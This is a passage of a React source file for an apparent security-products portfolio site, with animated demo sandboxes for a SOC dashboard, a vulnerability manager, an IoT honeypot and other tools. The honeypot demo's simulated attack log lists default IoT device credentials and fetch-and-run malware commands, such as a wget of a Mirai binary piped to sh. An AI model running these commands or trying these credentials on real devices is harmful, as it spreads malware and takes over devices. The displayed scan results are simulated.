import React, { useState, useEffect, useRef } from 'react'
import { motion, AnimatePresence, useMotionValue, useSpring, useTransform, useScroll } from 'framer-motion'
import { usePrefersReducedMotion } from '../hooks/usePrefersReducedMotion'
import ScrambleText from '../components/ScrambleText'
import { playLockdownSound, playSuccessSound } from '../lib/synth'

export const PRODUCTS = [
  {
    id: 'shielddesk',
    label: 'SHIELDDESK',
    tagline: 'Cybersecurity Command Center',
    statusBadge: 'Flagship',
    description: 'A comprehensive enterprise cybersecurity posture, operations, and incident response platform. Built with React & TypeScript — serving as a central intelligence hub for SOC analysts, IT administrators, and security leadership to monitor, manage, and remediate organizational risks in real time.',
    image: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=2070&auto=format&fit=crop',
    features: ['Real-time Risk Monitoring', 'Incident Response', 'Threat Intelligence', 'SOC Dashboard', 'Compliance Tracking'],
    color: '#C9A84C',
    badge: '01',
  },
  {
    id: 'vmp',
    label: 'VMP',
    tagline: 'Vulnerability Management Platform',
    description: 'A production-grade, multi-tenant security intelligence platform. Employs a Predictive Risk Prioritization Engine to parse thousands of daily alerts, matching NVD and CISA databases to isolate the 1% of vulnerabilities posing real, immediate operational threats.',
    image: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=2070&auto=format&fit=crop',
    features: ['Predictive Risk Engine', 'NVD & CISA Feeds', 'Known Exploited Vulns', 'Automated SLA Tracking', 'Remediation Roadmaps'],
    color: '#D4876B',
    badge: '02',
  },
  {
    id: 'sentineliot',
    label: 'SENTINEL-IoT',
    tagline: 'Deception Honeypot System',
    description: 'An advanced IoT honeypot emulating vulnerable connected devices (CCTVs, routers, DVRs). Captures automated malware scanner attacks, silently logging credentials dictionary brute-force, command sequences, and payload binaries.',
    image: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?q=80&w=2070&auto=format&fit=crop',
    features: ['Telnet/SSH Emulation', 'High-Fidelity Deception', 'Payload Extraction', 'SQLite & Cold Logging', 'Malware Downloader'],
    color: '#00FF9D',
    badge: '03',
  },
  {
    id: 'smecyber',
    label: 'Codex SME Cyber',
    tagline: 'SME Risk Dashboard',
    description: 'A cybersecurity posture management platform engineered for small and medium-sized businesses. Provides domain vulnerability scanning, guided expert questionnaires, automated weighted scoring, and compliance reporting.',
    image: 'https://images.unsplash.com/photo-1460925895917-afdab827c52f?q=80&w=2015&auto=format&fit=crop',
    features: ['Domain Scanning', 'Expert Questionnaires', 'Weighted Scoring Engine', 'Framework Mapping', 'PDF Report Export'],
    color: '#7BAADB',
    badge: '04',
  },
  {
    id: 'securevault',
    label: 'SecureVault',
    tagline: 'Fleet Hardware Diagnostic',
    description: 'Next-generation hardware integrity and security diagnostic platform for enterprise fleet management. Built with a macOS-inspired Liquid Glass aesthetic, providing differential audits, re-keying automation, and Slack/Discord webhook alerts.',
    image: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?q=80&w=2070&auto=format&fit=crop',
    features: ['Differential Analysis', 'Secure Enclave Audits', 'Identity Purge SOPs', 'Slack & Discord Hooks', 'Historical Archives'],
    color: '#B784A7',
    badge: '05',
  },
  {
    id: 'jobguard',
    label: 'JOBGUARD-UK',
    tagline: 'Fake Job Scam Crawler',
    description: 'A fully automated cyber-intelligence platform that crawls UK recruitment portals and Telegram/WhatsApp recruiter networks. Leverages BERT language models to attribute templates and Neo4j graphs to trace crypto and bank-mule networks.',
    image: 'https://images.unsplash.com/photo-1586281380349-632531db7ed4?q=80&w=2070&auto=format&fit=crop',
    features: ['BERT NLP Attribution', 'Neo4j Graph Network', 'Telegram/WhatsApp Scraping', 'Abuse Takedown Engine', 'Crypto Payment Tracing'],
    color: '#E0558A',
    badge: '06',
  },
  {
    id: 'erp',
    label: 'MINTS ERP',
    tagline: 'Enterprise Resource Planning',
    statusBadge: 'Most Selling',
    description: 'A state-of-the-art ERP system designed to centralize and automate core business operations. High-performance interface for HR, CRM, Project Management, Financial Tracking, and Automated Workflows — all in one unified platform.',
    image: 'https://images.unsplash.com/photo-1551288049-bebda4e38f71?q=80&w=2070&auto=format&fit=crop',
    features: ['HR Management', 'CRM & Sales', 'Project Tracking', 'Financial Analytics', 'Workflow Automation'],
    color: '#7BAE9C',
    badge: '07',
  },
  {
    id: 'mintcare',
    label: 'MINTCARE',
    tagline: 'Care Home Management',
    description: 'A comprehensive, role-based management application for modern care home administration. Features secure Google Sign-In, incident management, compliance tracking, resident care logs, analytics dashboard, family portal, and multi-role staff management.',
    image: 'https://images.unsplash.com/photo-1576091160399-112ba8d25d1d?q=80&w=2070&auto=format&fit=crop',
    features: ['Resident Management', 'Incident Reporting', 'Compliance Tracking', 'Family Portal', 'Staff Scheduling'],
    color: '#89B4A0',
    badge: '08',
  },
  {
    id: 'minora',
    label: 'MINORA',
    tagline: 'Event Control Platform',
    statusBadge: 'Under Production',
    description: 'A robust digital event control platform designed to manage and orchestrate large-scale physical and virtual events seamlessly. Real-time coordination, attendee management, and live analytics in a single command interface.',
    image: 'https://images.unsplash.com/photo-1492684223066-81342ee5ff30?q=80&w=2070&auto=format&fit=crop',
    features: ['Event Orchestration', 'Attendee Management', 'Live Analytics', 'Virtual Integration', 'Real-time Control'],
    color: '#C9A84C',
    badge: '09',
  },
]

/* ─── SHIELDDESK SECURITY SANDBOX ─── */
function ShieldDeskSandbox() {
  const [threatLevel, setThreatLevel] = useState(12)
  const [lockdown, setLockdown] = useState(false)
  const [scanning, setScanning] = useState(false)
  const [logs, setLogs] = useState([
    '[INFO] Initializing security core...',
    '[INFO] All firewall clusters report green.',
    '[INFO] Listening for incoming network packets...'
  ])

  const runScan = () => {
    if (scanning || lockdown) return
    setScanning(true)
    setLogs(prev => [...prev, '[SCAN] Running automated network port scan...'])
    setTimeout(() => {
      const foundThreats = Math.random() > 0.7 ? 1 : 0
      const newThreat = foundThreats ? Math.floor(Math.random() * 20) + 30 : Math.floor(Math.random() * 8) + 4
      setThreatLevel(newThreat)
      setLogs(prev => [
        ...prev,
        `[SCAN] Port scan completed. Found ${foundThreats} vulnerability risks.`,
        `[SCAN] Risk posture updated: ${newThreat}% threat score.`
      ])
      setScanning(false)
    }, 1000)
  }

  const triggerLockdown = () => {
    setLockdown(true)
    setThreatLevel(100)
    setLogs(prev => [
      ...prev,
      '[ALERT] CRITICAL LOCKDOWN INITIATED.',
      '[ALERT] Severing external routing endpoints...',
      '[OK] Security lockdown sequence finalized.'
    ])
    playLockdownSound()
  }

  const resetSystem = () => {
    setLockdown(false)
    setThreatLevel(12)
    setLogs(prev => [
      ...prev,
      '[INFO] Security lockdown reset authorized.',
      '[INFO] Restoring default network gateways...',
      '[OK] Posture normalized.'
    ])
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      {/* Alarm Warning Scrim */}
      <AnimatePresence>
        {lockdown && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 0.15 }}
            exit={{ opacity: 0 }}
            className="absolute inset-0 bg-red-600 pointer-events-none z-0 animate-pulse"
          />
        )}
      </AnimatePresence>

      {/* Grid status */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 relative z-10">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Risk Posture</span>
          <span className={`text-2xl font-bold font-number ${lockdown ? 'text-red-500' : 'text-accent-gold'}`}>{threatLevel}%</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Access Logs</span>
          <span className="text-sm font-bold text-beige-100">{logs.length} Recorded</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Firewall State</span>
          <span className={`text-sm font-bold ${lockdown ? 'text-red-500' : 'text-green-400 animate-pulse'}`}>
            {lockdown ? 'OFFLINE (SHIELDED)' : 'ACTIVE (SAFE)'}
          </span>
        </div>
      </div>

      {/* Cyber terminal logs */}
      <div className="flex-1 min-h-[160px] liquid-glass-panel p-4 bg-bg-deep/80 border-glass-border flex flex-col gap-2 relative z-10">
        <div className="flex items-center justify-between border-b border-white/5 pb-2">
          <span className="text-[9px] uppercase tracking-wider text-beige-300">Terminal Shell</span>
          <div className="flex gap-1.5">
            <span className="w-2.5 h-2.5 rounded-full bg-red-500/30" />
            <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/30" />
            <span className="w-2.5 h-2.5 rounded-full bg-green-500/30" />
          </div>
        </div>
        <div className="flex-1 overflow-y-auto flex flex-col gap-1 pr-2 max-h-[220px]">
          {logs.map((log, index) => (
            <div key={index} className={log.includes('ALERT') || log.includes('CRITICAL') ? 'text-red-400 font-bold' : log.includes('SCAN') ? 'text-accent-gold' : 'text-beige-300'}>
              {log}
            </div>
          ))}
          {scanning && <div className="text-accent-gold animate-pulse">Scanning ports in progress...</div>}
        </div>
      </div>

      {/* Shell Controls */}
      <div className="flex flex-wrap gap-3 mt-auto relative z-10">
        {!lockdown ? (
          <>
            <button
              onClick={runScan}
              disabled={scanning}
              data-cursor="link"
              className="px-4 py-2 border border-glass-border bg-glass-fill hover:bg-glass-fill-light text-beige-100 rounded hover:border-accent-gold/40 transition-colors disabled:opacity-50"
            >
              {scanning ? 'Scanning...' : 'Scan Segment'}
            </button>
            <button
              onClick={triggerLockdown}
              data-cursor="link"
              className="px-4 py-2 bg-red-600/90 text-white rounded hover:bg-red-500 transition-colors"
            >
              Trigger Lockdown
            </button>
          </>
        ) : (
          <button
            onClick={resetSystem}
            data-cursor="link"
            className="px-4 py-2 bg-accent-gold text-bg-deep rounded hover:bg-beige-100 transition-colors font-bold"
          >
            System Recovery Reset
          </button>
        )}
      </div>
    </div>
  )
}

/* ─── VMP RISK PRIORITIZATION ENGINE SANDBOX ─── */
function VmpSandbox() {
  const [riskScore, setRiskScore] = useState(84)
  const [totalVulns, setTotalVulns] = useState(12480)
  const [filtering, setFiltering] = useState(false)
  const [cves, setCves] = useState([
    { id: 'CVE-2026-0012', desc: 'Remote Code Execution in Core Lib', priority: 'High', threat: 'Exploited in wild' },
    { id: 'CVE-2025-4491', desc: 'Buffer Overflow in Net Gateway', priority: 'Medium', threat: 'Proof of concept' },
    { id: 'CVE-2025-1102', desc: 'Auth Bypass in SSO Cluster', priority: 'Critical', threat: 'Active scan activity' }
  ])
  const [logs, setLogs] = useState([
    '[INIT] Connecting to global NVD & CISA feeds...',
    '[INIT] Pulled 12,480 total vulnerability records.',
    '[WARNING] 84% Risk Posture score: Immediate attention required.'
  ])

  const runPredictiveFilter = () => {
    if (filtering) return
    setFiltering(true)
    setLogs(prev => [...prev, '[FILTER] Running Predictive Risk Prioritization...'])
    setTimeout(() => {
      setTotalVulns(42)
      setRiskScore(14)
      setCves([
        { id: 'CVE-2025-1102', desc: 'Auth Bypass in SSO Cluster', priority: 'Critical', threat: 'Active scan activity (MITIGATED)' }
      ])
      setLogs(prev => [
        ...prev,
        '[FILTER] NVD/CISA match complete. Removed 12,438 non-exploited vulnerabilities (99.6% noise reduction).',
        '[FILTER] Risk posture score reduced: 14% threat score.'
      ])
      setFiltering(false)
      playSuccessSound()
    }, 1200)
  }

  const remediateCve = (id) => {
    setCves(prev => prev.filter(c => c.id !== id))
    setLogs(prev => [...prev, `[REMEDIATE] Patched and resolved vulnerability ${id}.`])
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Total Vulnerabilities</span>
          <span className="text-xl font-bold font-number text-accent-gold">{totalVulns.toLocaleString()}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Executive Risk Score</span>
          <span className={`text-xl font-bold font-number ${riskScore > 50 ? 'text-red-500' : 'text-green-400'}`}>{riskScore}%</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Predictive Filter</span>
          <span className="text-xl font-bold text-beige-100">{filtering ? 'FILTERING...' : totalVulns > 100 ? 'NOISE ACTIVE' : 'OPTIMIZED'}</span>
        </div>
      </div>

      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Prioritized Vulnerabilities */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Actionable CVEs (Click to remediate)</span>
          <div className="flex flex-col gap-2 overflow-y-auto max-h-[160px] pr-2">
            {cves.length === 0 ? (
              <div className="text-green-400">All prioritized threats resolved!</div>
            ) : (
              cves.map(c => (
                <button
                  key={c.id}
                  onClick={() => remediateCve(c.id)}
                  data-cursor="link"
                  className="p-3 rounded bg-bg-elevated border border-white/5 text-[9px] text-left hover:border-accent-gold/40 transition-colors flex justify-between items-center"
                >
                  <div>
                    <div className="font-bold text-beige-100">{c.id} — {c.desc}</div>
                    <div className="text-beige-300/60 mt-0.5">Threat: {c.threat}</div>
                  </div>
                  <span className={`px-2 py-0.5 rounded text-[8px] font-bold ${c.priority === 'Critical' ? 'bg-red-950/40 text-red-400 border border-red-500/20' : 'bg-yellow-950/40 text-yellow-400 border border-yellow-500/20'}`}>
                    {c.priority}
                  </span>
                </button>
              ))
            )}
          </div>
        </div>

        {/* System log */}
        <div className="w-full md:w-1/3 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">VMP Log Stream</span>
          <div className="flex-1 overflow-y-auto max-h-[140px] flex flex-col gap-1.5 text-[9px] text-beige-300">
            {logs.map((log, index) => (
              <div key={index} className={log.includes('WARNING') ? 'text-red-400 font-bold' : log.includes('FILTER') ? 'text-accent-gold' : 'text-beige-300/70'}>
                {log}
              </div>
            ))}
          </div>
        </div>
      </div>

      <div className="flex gap-3 mt-auto">
        <button
          onClick={runPredictiveFilter}
          disabled={filtering || totalVulns <= 50}
          data-cursor="link"
          className="px-4 py-2 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors disabled:opacity-50 text-[10px] uppercase tracking-wider"
        >
          {filtering ? 'Prioritizing...' : 'Run Predictive Filter'}
        </button>
      </div>
    </div>
  )
}

/* ─── SENTINEL-IOT HONEYPOT SANDBOX ─── */
function SentinelIotSandbox() {
  const [emulatorState, setEmulatorState] = useState('ACTIVE')
  const [attacksCount, setAttacksCount] = useState(148)
  const [logs, setLogs] = useState([
    '[INIT] Sentinel-IoT core listening on Port 22 (SSH) and Port 23 (Telnet)...',
    '[OK] Emulating Hikvision CCTV Interface v4.2.8...',
    '[INTEL] Capturing malware payloads silently.'
  ])
  const [intelList, setIntelList] = useState([])

  const simulateAttack = () => {
    if (emulatorState !== 'ACTIVE') return
    const creds = [
      'admin:1234 (Hikvision DVR)',
      'root:xc3511 (Dahua DVR)',
      'realtek:realtek (Realtek Router SDK)',
      'admin:admin (Netgear Generic)'
    ]
    const payloads = [
      'wget http://84.220.19.12/bins/mirai.arm7 -O - | sh',
      'curl http://mozi.onion/malware.sh -o mozi.sh; chmod +x mozi.sh; ./mozi.sh',
      'echo -e "\\x7f\\x45\\x4c\\x46" > /tmp/malware'
    ]

    const selectedCred = creds[Math.floor(Math.random() * creds.length)]
    const selectedPayload = payloads[Math.floor(Math.random() * payloads.length)]

    setAttacksCount(prev => prev + 1)
    setLogs(prev => [
      ...prev,
      `[ATTACK] Brute force attempt from IP: ${Math.floor(Math.random() * 150 + 10)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      `[ATTACK] Tried credential combo: ${selectedCred}`,
      `[DECEPTION] Intruder authenticated. Shell session spawned.`,
      `[PAYLOAD] Execution attempt blocked: "${selectedPayload}"`,
      `[MALWARE] Safe downloader triggered. Extraction started...`
    ])

    setTimeout(() => {
      setIntelList(prev => [
        `Captured Payload: "${selectedPayload.slice(0, 32)}..." from threat node.`,
        ...prev
      ])
      setLogs(prev => [...prev, `[OK] Captured and sandboxed malware sample successfully.`])
      playSuccessSound()
    }, 1000)
  }

  const toggleEmulator = () => {
    if (emulatorState === 'ACTIVE') {
      setEmulatorState('OFFLINE')
      setLogs(prev => [...prev, '[SYS] Honeypot emulator listeners suspended.'])
    } else {
      setEmulatorState('ACTIVE')
      setLogs(prev => [...prev, '[SYS] Restored IoT device decapsulation listeners.'])
      playSuccessSound()
    }
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Honeypot State</span>
          <span className={`text-xl font-bold ${emulatorState === 'ACTIVE' ? 'text-green-400 animate-pulse' : 'text-red-500'}`}>{emulatorState}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Captured Attacks</span>
          <span className="text-xl font-bold font-number text-accent-gold">{attacksCount}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Vectors Emulated</span>
          <span className="text-sm font-bold text-beige-100">Telnet (23) / SSH (22)</span>
        </div>
      </div>

      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Live Attack Logs */}
        <div className="flex-1 liquid-glass-panel p-4 bg-bg-deep/80 border-glass-border flex flex-col gap-2">
          <span className="text-[9px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Honeypot Shell Monitor</span>
          <div className="flex-1 overflow-y-auto max-h-[140px] flex flex-col gap-1 text-[9px] pr-1">
            {logs.map((log, i) => (
              <div key={i} className={log.includes('PAYLOAD') ? 'text-red-400' : log.includes('OK') ? 'text-green-400' : log.includes('ATTACK') ? 'text-accent-gold' : 'text-beige-300/60'}>
                {log}
              </div>
            ))}
          </div>
        </div>

        {/* Captured Intelligence */}
        <div className="w-full md:w-1/3 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Malware Captured</span>
          <div className="flex-1 overflow-y-auto max-h-[140px] flex flex-col gap-2 text-[9px] text-beige-300/70">
            {intelList.length === 0 ? (
              <div className="text-beige-300/30">Awaiting payload vectors...</div>
            ) : (
              intelList.map((intel, idx) => (
                <div key={idx} className="border-l-2 border-accent-gold pl-2">{intel}</div>
              ))
            )}
          </div>
        </div>
      </div>

      <div className="flex gap-3 mt-auto">
        <button
          onClick={simulateAttack}
          disabled={emulatorState !== 'ACTIVE'}
          data-cursor="link"
          className="px-4 py-2 border border-glass-border bg-glass-fill hover:bg-glass-fill-light text-beige-100 rounded hover:border-accent-gold/40 transition-colors disabled:opacity-50 text-[10px]"
        >
          Simulate Attack Vector
        </button>
        <button
          onClick={toggleEmulator}
          data-cursor="link"
          className={`px-4 py-2 rounded text-bg-deep font-bold transition-colors text-[10px] uppercase ${emulatorState === 'ACTIVE' ? 'bg-red-500 hover:bg-red-400' : 'bg-green-400 hover:bg-green-300'}`}
        >
          {emulatorState === 'ACTIVE' ? 'Stop Honeypot' : 'Start Honeypot'}
        </button>
      </div>
    </div>
  )
}

/* ─── SME CYBER RISK DASHBOARD SANDBOX ─── */
function SmeCyberSandbox() {
  const [domain, setDomain] = useState('')
  const [scanning, setScanning] = useState(false)
  const [riskGrade, setRiskGrade] = useState('D')
  const [scores, setScores] = useState({ domainScore: 40, questionnaireScore: 55 })
  const [logs, setLogs] = useState([
    '[SYSTEM] Codex SME Cyber initial posture dashboard.',
    '[SYSTEM] Maturity grade is calculated from Domain Scanning + Assessment.',
    '[OK] Posture grade: D (Urgent action advised)'
  ])

  const runDomainScan = (e) => {
    e.preventDefault()
    if (!domain || scanning) return
    setScanning(true)
    setLogs(prev => [...prev, `[SCAN] Running non-intrusive domain scan on: ${domain}...`])
    setTimeout(() => {
      setScores(prev => ({ ...prev, domainScore: 88 }))
      setRiskGrade('B')
      setLogs(prev => [
        ...prev,
        `[SCAN] Port scan & DNS audit completed for ${domain}.`,
        '[SCAN] No critical vulnerabilities found in domain dns record.',
        '[OK] Grade updated: B (Good posture)'
      ])
      setScanning(false)
      playSuccessSound()
    }, 1200)
  }

  const answerQuestionnaire = () => {
    setScores(prev => ({ ...prev, questionnaireScore: 92 }))
    setRiskGrade(prev => (prev === 'B' || prev === 'A' ? 'A' : 'C'))
    setLogs(prev => [
      ...prev,
      '[ASSESSMENT] Questionnaires audited (MFA enforced, daily offline backups verified).',
      '[OK] Security compliance score increased.'
    ])
    playSuccessSound()
  }

  const calculatedScore = Math.floor((scores.domainScore + scores.questionnaireScore) / 2)

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Security Grade</span>
          <span className={`text-xl font-bold font-number ${riskGrade === 'A' || riskGrade === 'B' ? 'text-green-400' : 'text-red-500'}`}>{riskGrade}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Weighted Score</span>
          <span className="text-xl font-bold text-accent-gold">{calculatedScore} / 100</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Domain Check</span>
          <span className="text-xl font-bold text-beige-100">{scanning ? 'SCANNING...' : 'READY'}</span>
        </div>
      </div>

      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Domain Scan Panel */}
        <form onSubmit={runDomainScan} className="w-full md:w-1/2 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20 justify-center">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Automated Domain Scanner</span>
          <div className="flex flex-col gap-1.5">
            <label className="text-[8px] uppercase tracking-wider text-beige-300">Target Domain Name</label>
            <input
              type="text"
              value={domain}
              onChange={e => setDomain(e.target.value)}
              placeholder="e.g. example.com"
              className="w-full bg-bg-deep border border-glass-border rounded px-2.5 py-1.5 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold text-xs"
            />
          </div>
          <button
            type="submit"
            disabled={scanning || !domain}
            data-cursor="link"
            className="w-full py-2 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors text-[10px] disabled:opacity-50"
          >
            {scanning ? 'Scanning Domain...' : 'Scan Domain'}
          </button>
        </form>

        {/* Assessment & Logs */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Remediation Status Logs</span>
          <div className="flex-1 liquid-glass-panel p-3 bg-bg-deep/40 border-glass-border flex flex-col gap-3">
            <div className="flex-1 overflow-y-auto max-h-[100px] flex flex-col gap-1.5 text-[9px] text-beige-300/70">
              {logs.map((log, index) => (
                <div key={index} className="border-l border-accent-gold/40 pl-2.5">
                  {log}
                </div>
              ))}
            </div>
            <button
              onClick={answerQuestionnaire}
              data-cursor="link"
              className="w-full py-2 border border-glass-border bg-glass-fill hover:bg-glass-fill-light text-beige-100 rounded text-[10px] uppercase"
            >
              Simulate Compliance Assessment
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ─── SECUREVAULT FLEET DIAGNOSTIC SANDBOX ─── */
function SecureVaultSandbox() {
  const [deviceCompare, setDeviceCompare] = useState('Apple vs Samsung')
  const [logs, setLogs] = useState([
    '[VAULT] Cryptographic registry operational.',
    '[VAULT] Active fleet: 1,480 units.',
    '[OK] Differential integrity: Balanced'
  ])
  const [mitigating, setMitigating] = useState(false)
  const [biometricsStatus, setBiometricsStatus] = useState('Drift Detected')

  const triggerRemediation = () => {
    if (mitigating) return
    setMitigating(true)
    setLogs(prev => [...prev, '[PATCH] Enrolling new Secure Enclave keys...', '[PATCH] Running identification protocols...'])
    setTimeout(() => {
      setBiometricsStatus('KEYS STABLE')
      setLogs(prev => [
        ...prev,
        '[PATCH] Mitigated CVE in local fleet kernel.',
        '[OK] Fleet biometric keys stabilized successfully.'
      ])
      setMitigating(false)
      playSuccessSound()
    }, 1200)
  }

  const changeComparison = (e) => {
    const val = e.target.value
    setDeviceCompare(val)
    setLogs(prev => [
      ...prev,
      `[COMPARE] Auditing fleet deltas: ${val}`,
      `[COMPARE] Registry Status: Apple Secure Enclave vs Samsung Knox verified.`
    ])
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Enclave State</span>
          <span className={`text-sm font-bold ${biometricsStatus === 'KEYS STABLE' ? 'text-green-400' : 'text-red-500 animate-pulse'}`}>{biometricsStatus}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Alert Protocols</span>
          <span className="text-sm font-bold text-beige-100">Slack/Discord Webhooks</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Fleet Count</span>
          <span className="text-sm font-bold text-accent-gold">1,480 Units</span>
        </div>
      </div>

      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Compare Engine */}
        <div className="w-full md:w-1/3 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Differential Analysis</span>
          <div className="flex flex-col gap-2 justify-center h-full">
            <label className="text-[8px] uppercase tracking-wider text-beige-300">Auditing Delta Matrix</label>
            <select
              value={deviceCompare}
              onChange={changeComparison}
              className="bg-bg-deep border border-glass-border rounded px-2 py-1.5 text-beige-100 focus:outline-none focus:border-accent-gold text-xs"
            >
              <option value="Apple vs Samsung">Apple Secure Enclave vs Samsung Knox</option>
              <option value="Windows Hello vs Mac">Windows Hello vs Apple T2</option>
              <option value="Yubikey vs Titan">Yubikey 5 FIPS vs Google Titan</option>
            </select>
          </div>
        </div>

        {/* Audit timeline */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Auditor Log Timeline</span>
          <div className="flex-1 liquid-glass-panel p-4 bg-bg-deep/40 border-glass-border flex flex-col gap-3">
            <div className="flex-1 overflow-y-auto max-h-[100px] flex flex-col gap-1.5 text-[9px] text-beige-300/70">
              {logs.map((log, index) => (
                <div key={index} className="border-l border-accent-gold/40 pl-2.5">
                  {log}
                </div>
              ))}
            </div>
            <button
              onClick={triggerRemediation}
              disabled={mitigating || biometricsStatus === 'KEYS STABLE'}
              data-cursor="link"
              className="w-full py-2 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors text-[10px] uppercase tracking-wider disabled:opacity-50"
            >
              {mitigating ? 'Mitigating Kernel...' : 'Deploy Cryptographic Mitigation'}
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ─── JOBGUARD-UK SCAM TRACKER SANDBOX ─── */
function JobGuardSandbox() {
  const [crawling, setCrawling] = useState(false)
  const [attribution, setAttribution] = useState('No Campaign Loaded')
  const [nodesCount, setNodesCount] = useState(0)
  const [logs, setLogs] = useState([
    '[INIT] JobGuard-UK engine online. Scanning UK recruitment portals...',
    '[INIT] Crawlers listening for suspicious WhatsApp/Telegram recruiters.',
    '[OK] Threat model database loaded.'
  ])

  const runCrawl = () => {
    if (crawling) return
    setCrawling(true)
    setLogs(prev => [...prev, '[BERT] Scraping recruitment boards for ad templates...', '[BERT] Parsing syntax structures...'])
    setTimeout(() => {
      setAttribution('BERT Index: Advance-Fee Recruiter Fraud (98.4% Confidence)')
      setNodesCount(12)
      setLogs(prev => [
        ...prev,
        '[BERT] Scrape complete. Identified active scam campaign.',
        '[OK] Fingerprint matching: BERT identified organized criminal network template.',
        '[GRAPH] Built Neo4j map: 12 infrastructure nodes linked (IPs, Wallets, Telegram handles).'
      ])
      setCrawling(false)
      playSuccessSound()
    }, 1200)
  }

  const triggerTakedown = () => {
    setLogs(prev => [
      ...prev,
      '[DISRUPT] Compiling Neo4j infrastructure data...',
      '[DISRUPT] Automated abuse packet dispatched to ISP and Registrar.',
      '[OK] Abuse takedown notice completed: Campaign servers blocked.'
    ])
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">BERT Attribution</span>
          <span className="text-[10px] font-bold text-accent-gold truncate">{attribution}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Neo4j Nodes Mapped</span>
          <span className="text-xl font-bold font-number text-beige-100">{nodesCount}</span>
        </div>
